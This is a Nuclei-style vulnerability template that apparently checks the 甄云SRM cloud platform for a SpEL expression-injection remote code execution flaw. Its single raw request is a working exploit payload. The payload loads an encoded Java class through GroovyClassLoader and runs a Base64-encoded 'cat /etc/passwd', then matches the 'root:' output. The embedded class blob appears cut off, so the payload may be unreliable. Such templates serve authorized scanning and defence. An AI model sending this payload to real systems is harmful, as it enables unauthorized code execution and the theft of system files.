id: poc-yaml-going-link-srm-oauth-public-spel-expression-injection
info:
  name: 甄云SRM云平台 oauth-public SpEL表达式注入漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce
  description: |
    This template targets the 甄云SRM云平台 oauth-public SpEL expression injection
    vulnerability to detect potential remote code execution (RCE).
http:
  - raw:
      - |
        GET /oauth/public/%5f%5f%24%7bT(groovy.lang.GroovyClassLoader).newInstance().defineClass('CALC',T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('yv66vgAAADQAqwoAJABOCgBPAFAHAFEKAAMAUgoAAwBTCwBUAFUIAD8LAFYAVwcAWAoAWQBaCgBbAFwKAAkAXQgAXgoAXwBgCgAJAGEIAGIKAAkAYwgAZAgAZQgAZggAZwoAaABpCgBoAGoKAGsAbAcAbQoAGQBuCABvCgAZAHAKABkAcQoAGQByCABzCgB0AHUKAHQAdgoAdAB3BwB4BwB5AQAGPGluaXQ%%'.replace('xxxx',new%20String(T(com.sun.org.apache.xml.internal.security.utils.Base64).decode('Lw=='))))).newInstance()-1%7d%5f%5f%3a%3a%78/ab?username=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "root:"
          - "/bin"
      - type: regex
        part: body
        regex:
          - "^(?!.*<).*$"
